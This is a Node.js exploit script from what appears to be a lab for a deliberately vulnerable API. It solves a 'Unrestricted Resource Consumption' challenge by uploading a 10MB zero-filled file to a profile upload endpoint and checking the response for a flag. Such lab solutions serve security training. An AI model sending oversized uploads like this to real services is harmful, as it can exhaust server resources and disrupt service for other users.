/**
 * Challenge: 0xa4 - Unrestricted Resource Consumption
 * Exploit: Upload large file to /api/profile/upload
 */

const fs = require('fs');
const path = require('path');
const { createLogger, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa4');
    log('Starting 0xa4 exploit: Unrestricted Resource Consumption');

    // Create a large file (10MB should be enough to trigger the vulnerability)
    const largeFile = path.join(require('os').tmpdir(), `dvapi_large_file_${Date.now()}.dat`);
    const fileSize = 10 * 1024 * 1024; // 10MB

    log(`Creating large file (${(fileSize / 1024 / 1024).toFixed(2)}MB)...`);
    try {
        // Create file with zeros
        const buffer = Buffer.alloc(fileSize);
        fs.writeFileSync(largeFile, buffer);
    } catch (error) {
        log(`⚠️  Could not create large file: ${error.message}`);
        // Fallback: create smaller file
        fs.writeFileSync(largeFile, Buffer.alloc(1024 * 1024)); // 1MB
    }

    try {
        log('Uploading large file to /api/profile/upload...');
        
        // Use built-in FormData with Blob (Node.js 18+)
        const fileContent = fs.readFileSync(largeFile);
        const form = new FormData();
        const blob = new Blob([fileContent], { type: 'application/octet-stream' });
        form.append('profilePic', blob, 'large_file.dat');

        const response = await fetch(`${baseUrl}/api/profile/upload`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
            },
            body: form,
        });

        const text = await response.text();
        let data;
        try {
            data = JSON.parse(text);
        } catch {
            data = text;
        }

        log(`Upload response: ${JSON.stringify(data)}`);

        // Check if flag is in response
        const flag = extractFlag(JSON.stringify(data));
        if (flag) {
            saveFlag(flag);
            return { success: true, flag };
        }

        // Check if upload was successful
        if (response.ok || JSON.stringify(data).toLowerCase().includes('success') || 
            JSON.stringify(data).toLowerCase().includes('uploaded')) {
            log('✅ File uploaded successfully (vulnerability exploited)');
            return { success: true };
        }

        log('❌ Upload may have failed');
        return { success: false };
    } finally {
        // Clean up
        try {
            fs.unlinkSync(largeFile);
        } catch (error) {
            // Ignore cleanup errors
        }
    }
}

module.exports = { run };
